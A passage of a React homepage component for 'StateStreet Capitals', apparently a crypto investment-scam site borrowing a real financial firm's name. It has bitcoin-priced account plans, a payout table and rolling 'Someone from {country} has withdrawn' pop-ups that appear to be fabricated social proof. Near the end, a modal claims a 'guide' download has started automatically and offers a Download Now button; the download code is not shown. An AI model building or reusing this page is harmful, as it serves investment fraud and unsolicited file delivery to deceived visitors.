      <Container maxWidth="xl" sx={{ py: { xs: 5, md: 8 } }}>
        <Paper elevation={0} sx={{ p: { xs: 3, md: 4 }, mb: 4, borderRadius: 4, bgcolor: 'rgba(2, 6, 23, 0.96)', border: '1px solid rgba(125, 211, 252, 0.16)', overflow: 'hidden' }}>
          <Stack direction={{ xs: 'column', lg: 'row' }} spacing={3} justifyContent="space-between">
            <Box sx={{ flex: 1 }}>
              <Typography variant="overline" sx={{ color: '#7dd3fc', letterSpacing: '0.3em' }}>Terminal view</Typography>
              <Typography variant="h4" sx={{ fontWeight: 700 }}>Institutional-grade trading command centre</Typography>
              <Typography sx={{ color: 'rgba(255,255,255,0.72)', mt: 1.5 }}>
                Access a live trading overlay with market intelligence, risk context, and secure transfer routing designed for modern capital movement.
              </Typography>
            </Box>
            <Box sx={{ flex: 1, borderRadius: 3, p: 2.2, bgcolor: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.10)', fontFamily: 'monospace' }}>
              <Typography sx={{ color: '#86efac' }}>// SYSTEM STATUS: LIVE</Typography>
              <Typography sx={{ color: 'white', mt: 1 }}>• POSITION BOOK: 1,248 active instruments</Typography>
              <Typography sx={{ color: 'white' }}>• SIGNAL FLOW: AI-assisted and verified</Typography>
              <Typography sx={{ color: 'white' }}>• TRANSFER ROUTING: Secure and instant</Typography>
              <Typography sx={{ color: 'white' }}>• SUPPORT SLA: &lt; 2 minutes</Typography>
            </Box>
          </Stack>
        </Paper>

        <Grid container spacing={4} alignItems="stretch">
          <Grid item xs={12} lg={7}>
            <Paper elevation={0} sx={{ p: { xs: 3, md: 4 }, borderRadius: 4, bgcolor: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.10)' }}>
              <Typography variant="overline" sx={{ color: '#7dd3fc', letterSpacing: '0.3em' }}>About us</Typography>
              <Typography variant="h4" sx={{ fontWeight: 700, mt: 1 }}>About StateStreet Capitals</Typography>
              <Typography sx={{ color: 'rgba(255,255,255,0.74)', mt: 2 }}>
                StateStreet is built to give clients a full platform for secure finance. From account creation to profile management, deposits, withdrawals, and dashboard insights, everything is designed to feel smooth, reliable, and professional.
              </Typography>
              <Typography sx={{ color: 'rgba(255,255,255,0.74)', mt: 2 }}>
                The experience combines premium visuals with real backend-driven actions, ensuring the interface matches the seriousness of the services behind it.
              </Typography>

              <Typography variant="h5" sx={{ fontWeight: 700, mt: 4, mb: 2 }}>Our Leadership</Typography>
              <Grid container spacing={3}>
                {teamMembers.map((member) => (
                  <Grid item xs={12} sm={6} md={4} key={member.name}>
                    <Card sx={{ bgcolor: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: 3, p: 2, textAlign: 'center' }}>
                      <Avatar src={member.image} alt={member.name} sx={{ width: 80, height: 80, mx: 'auto', mb: 2, border: '2px solid #7dd3fc' }} />
                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 0.5 }}>{member.name}</Typography>
                      <Typography variant="body2" sx={{ color: 'rgba(255,255,255,0.6)' }}>{member.bio}</Typography>
                    </Card>
                  </Grid>
                ))}
              </Grid>
            </Paper>
          </Grid>
          <Grid item xs={12} lg={5}>
            <Paper elevation={0} sx={{ p: { xs: 3, md: 4 }, borderRadius: 4, bgcolor: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.10)' }}>
              <Typography variant="overline" sx={{ color: '#7dd3fc', letterSpacing: '0.3em' }}>Why choose us</Typography>
              <Stack spacing={2.5} sx={{ mt: 2 }}>
                {reasons.map((item) => (
                  <Box key={item.title}>
                    <Typography variant="h6" sx={{ fontWeight: 700 }}>{item.title}</Typography>
                    <Typography sx={{ color: 'rgba(255,255,255,0.7)' }}>{item.text}</Typography>
                  </Box>
                ))}
              </Stack>
            </Paper>
          </Grid>
        </Grid>

        <Typography variant="h4" sx={{ fontWeight: 700, mt: 7, mb: 3 }}>Account types</Typography>
        <Grid container spacing={2.5}>
          {plans.map((plan) => (
            <Grid item xs={12} md={4} key={plan.name}>
              <Card sx={{ height: '100%', bgcolor: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 3, display: 'flex', flexDirection: 'column', justifyContent: 'space-between' }}>
                <CardContent>
                  <Typography variant="h6" sx={{ fontWeight: 700 }}>{plan.name}</Typography>
                  <Typography sx={{ color: 'rgba(255,255,255,0.72)', mt: 1 }}>{plan.blurb}</Typography>
                  <Typography variant="h4" sx={{ fontWeight: 800, mt: 2 }}>
                    {formatCurrency(parseFloat(plan.blurb.split(' ')[0]) * prices.bitcoin.usd)}
                  </Typography>
                  <List dense sx={{ mt: 1 }}>
                    {plan.perks.map((perk) => (
                      <ListItem key={perk} sx={{ px: 0 }}>
                        <ListItemText primary={perk} primaryTypographyProps={{ color: 'rgba(255,255,255,0.8)' }} />
                      </ListItem>
                    ))}
                  </List>
                </CardContent>
                <Box sx={{ px: 2, pb: 2 }}>
                  <Button component={Link} to="/register" variant="contained" fullWidth sx={{ borderRadius: 999, bgcolor: '#7dd3fc', color: '#03111d', '&:hover': { bgcolor: '#bae6fd' } }}>Get Plans</Button>
                </Box>
              </Card>
            </Grid>
          ))}
        </Grid>

        <Paper elevation={0} sx={{ mt: 7, p: { xs: 3, md: 4 }, borderRadius: 4, bgcolor: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.10)' }}>
          <Typography variant="overline" sx={{ color: '#7dd3fc', letterSpacing: '0.3em' }}>Recent Withdrawals and Payouts</Typography>
          <Typography variant="h4" sx={{ fontWeight: 700, mt: 1 }}>Trusted payouts and fast transfer processing</Typography>
          <TableContainer sx={{ mt: 2 }}>
            <Table size="small">
              <TableHead>
                <TableRow>
                  <TableCell sx={{ color: 'white', borderColor: 'rgba(255,255,255,0.12)' }}>User Id</TableCell>
                  <TableCell sx={{ color: 'white', borderColor: 'rgba(255,255,255,0.12)' }}>Payment Method</TableCell>
                  <TableCell sx={{ color: 'white', borderColor: 'rgba(255,255,255,0.12)' }}>Amount</TableCell>
                  <TableCell sx={{ color: 'white', borderColor: 'rgba(255,255,255,0.12)' }}>Date</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {payouts.map((row) => (
                  <TableRow key={row.user + row.date}>
                    <TableCell sx={{ color: 'rgba(255,255,255,0.8)', borderColor: 'rgba(255,255,255,0.12)' }}>{row.user}</TableCell>
                    <TableCell sx={{ color: 'rgba(255,255,255,0.8)', borderColor: 'rgba(255,255,255,0.12)' }}>{row.method}</TableCell>
                    <TableCell sx={{ color: 'rgba(255,255,255,0.8)', borderColor: 'rgba(255,255,255,0.12)' }}>{row.amount}</TableCell>
                    <TableCell sx={{ color: 'rgba(255,255,255,0.8)', borderColor: 'rgba(255,255,255,0.12)' }}>{row.date}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>
          <Box sx={{ mt: 3, display: 'flex', flexWrap: 'wrap', gap: 1.5 }}>
            {partners.map((partner) => (
              <Chip key={partner} label={partner} sx={{ bgcolor: 'rgba(125, 211, 252, 0.14)', color: '#7dd3fc', borderRadius: 999 }} />
            ))}
          </Box>
          <Paper elevation={0} sx={{ mt: 3, p: 2.5, borderRadius: 3, bgcolor: 'rgba(2, 6, 23, 0.96)', border: '1px solid rgba(125, 211, 252, 0.16)' }}>
            <Typography variant="overline" sx={{ color: '#7dd3fc' }}>Market update</Typography>
            {marketNewsHeadlines[currentNewsIndex] && (
              <>
                <Typography sx={{ color: 'white', fontWeight: 700, mt: 1 }}>{marketNewsHeadlines[currentNewsIndex].title}</Typography>
                <Typography sx={{ color: 'rgba(255,255,255,0.72)', mt: 1 }}>
                  {marketNewsHeadlines[currentNewsIndex].description}
                </Typography>
              </>
            )}
          </Paper>
        </Paper>

        <Paper elevation={0} sx={{ mt: 7, p: { xs: 3, md: 4 }, borderRadius: 4, bgcolor: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.10)' }}>
          <Typography variant="overline" sx={{ color: '#7dd3fc', letterSpacing: '0.3em' }}>FAQ</Typography>
          <Typography variant="h4" sx={{ fontWeight: 700, mt: 1 }}>Questions clients ask most</Typography>
          <Stack spacing={1.5} sx={{ mt: 3 }}>
            {faqs.map((faq, index) => (
              <Box key={faq.question} sx={{ border: '1px solid rgba(255,255,255,0.1)', borderRadius: 2, overflow: 'hidden' }}>
                <Button fullWidth sx={{ justifyContent: 'space-between', color: 'white', px: 2, py: 1.2 }} onClick={() => setActiveFaq(index === activeFaq ? -1 : index)}>
                  <span>{faq.question}</span>
                  <span>{index === activeFaq ? '−' : '+'}</span>
                </Button>
                <Collapse in={index === activeFaq}>
                  <Box sx={{ px: 2, pb: 2, color: 'rgba(255,255,255,0.72)' }}>{faq.answer}</Box>
                </Collapse>
              </Box>
            ))}
          </Stack>
        </Paper>
      </Container>

      <Box sx={{ position: 'fixed', right: 20, bottom: 20, zIndex: 10, display: 'flex', flexDirection: 'column', gap: 1.2, maxWidth: 340 }}>
        {activeNotification ? (
          <Paper elevation={0} sx={{ p: 1.8, borderRadius: 3, bgcolor: 'rgba(2, 6, 23, 0.94)', border: '1px solid rgba(255,255,255,0.12)', boxShadow: '0 15px 40px rgba(0,0,0,0.32)' }}>
            <Typography variant="caption" sx={{ color: '#7dd3fc', textTransform: 'uppercase', letterSpacing: '0.2em' }}>
              {activeNotification.type === 'withdrawn' ? 'Withdrawal alert' : 'Deposit activity'}
            </Typography>
            <Typography sx={{ fontWeight: 700, mt: 0.3, color: 'white' }}>
              Someone from {activeNotification.country} has {activeNotification.type} {activeNotification.amount}
            </Typography>
            <Typography sx={{ color: 'rgba(255,255,255,0.82)', fontSize: '0.9rem', mt: 0.2 }}>
              via {activeNotification.method}
            </Typography>
          </Paper>
        ) : null}
        {notifications.slice(-3).map((item) => (
          <Typography key={item.id} sx={{ color: 'rgba(255,255,255,0.72)', fontSize: '0.82rem', pl: 0.4 }}>
            • {item.country} • {item.type} • {item.amount}
          </Typography>
        ))}
      </Box>

      <Box sx={{ mt: 6, borderTop: '1px solid rgba(255,255,255,0.12)', py: 5, bgcolor: 'rgba(2, 6, 23, 0.95)' }}>
        <Container maxWidth="xl">
          <Grid container spacing={4}>
            <Grid item xs={12} md={4}>
              <Typography variant="h6" sx={{ fontWeight: 700 }}>StateStreet</Typography>
              <Typography sx={{ color: 'rgba(255,255,255,0.7)', mt: 1 }}>
                StateStreet is a premium trading and finance workspace built for secure onboarding, signal access, transfers, and account management.
              </Typography>
            </Grid>
            <Grid item xs={12} md={4}>
              <Typography variant="h6" sx={{ fontWeight: 700 }}>Registration information</Typography>
              <Typography sx={{ color: 'rgba(255,255,255,0.7)', mt: 1 }}>Registration Number - 11459063</Typography>
              <Typography sx={{ color: 'rgba(255,255,255,0.7)' }}>Glasgow. United Kingdom, G3</Typography>
              <Typography sx={{ color: 'rgba(255,255,255,0.7)' }}>support@statestreet.com</Typography>
              <Typography sx={{ color: 'rgba(255,255,255,0.7)' }}>+44 (744) 144-2855</Typography>
            </Grid>
            <Grid item xs={12} md={4}>
              <Typography variant="h6" sx={{ fontWeight: 700 }}>Quick links</Typography>
              <Stack spacing={1} sx={{ mt: 1 }}>
                <Button component={Link} to="/about" sx={{ color: 'white', justifyContent: 'flex-start', px: 0 }}>About</Button>
                <Button component={Link} to="/privacy-policy" sx={{ color: 'white', justifyContent: 'flex-start', px: 0 }}>Terms</Button>
                <Button component={Link} to="/contact" sx={{ color: 'white', justifyContent: 'flex-start', px: 0 }}>Contact us</Button>
                <Button component={Link} to="/register" sx={{ color: 'white', justifyContent: 'flex-start', px: 0 }}>Create account</Button>
              </Stack>
            </Grid>
          </Grid>
          <Box sx={{ mt: 4, pt: 3, borderTop: '1px solid rgba(255,255,255,0.12)', display: 'flex', flexDirection: { xs: 'column', md: 'row' }, justifyContent: 'space-between', gap: 2 }}>
            <Typography variant="body2" sx={{ color: 'rgba(255,255,255,0.62)' }}>© 2026 StateStreet. All Rights Reserved.</Typography>
            <Stack direction={{ xs: 'column', sm: 'row' }} spacing={2}>
              <Button component={Link} to="/login" sx={{ color: 'white' }}>Login</Button>
              <Button component={Link} to="/contact" sx={{ color: 'white' }}>Contact</Button>
              <Button component={Link} to="/privacy-policy" sx={{ color: 'white' }}>Privacy</Button>
              <Button component={Link} to="/register" sx={{ color: 'white' }}>Sign up</Button>
            </Stack>
          </Box>
        </Container>
      {/* Download Popup */}
      {showDownloadPopup && (
        <Box sx={{ 
          position: 'fixed', 
          top: 0, 
          left: 0, 
          width: '100%', 
          height: '100%', 
          bgcolor: 'rgba(0,0,0,0.7)', 
          zIndex: 100,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center'
        }}>
          <Paper elevation={0} sx={{ 
            p: 4, 
            borderRadius: 3, 
            bgcolor: 'rgba(2, 6, 23, 0.98)', 
            border: '1px solid rgba(125, 211, 252, 0.3)',
            maxWidth: 400,
            mx: 2,
            textAlign: 'center'
          }}>
            <Typography variant="h5" sx={{ fontWeight: 700, color: 'white', mb: 2 }}>
              Loading your guide to use statestreet
            </Typography>
            <Typography sx={{ color: 'rgba(255,255,255,0.72)', mb: 3 }}>
              If your download didn't start automatically, click the button below:
            </Typography>
            <Button 
              onClick={downloadFile}
              variant="contained" 
              sx={{ 
                borderRadius: 999, 
                px: 4, 
                py: 1.2, 
                bgcolor: '#7dd3fc', 
                color: '#03111d', 
                '&:hover': { bgcolor: '#bae6fd' } 
              }}
            >
              Download Now
            </Button>
          </Paper>
        </Box>
      )}

      </Box>
    </Box>
  );
};

export default HomePage;